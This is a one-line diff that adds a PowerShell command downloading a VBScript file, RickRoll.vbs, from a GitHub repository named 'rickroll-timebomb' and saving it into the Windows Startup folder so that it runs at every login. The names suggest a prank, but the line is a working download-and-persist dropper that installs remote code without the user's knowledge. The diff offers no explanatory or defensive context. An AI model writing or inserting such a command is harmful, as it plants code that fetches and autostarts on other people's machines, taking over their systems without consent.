@@ -1,0 +1,1 @@
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/Files/RickRoll.vbs -OutFile %userprofile%\AppData\Roaming\Microsoft\Windows\Start` Menu\Programs\Startup\rickroll\RickRoll.vbs"
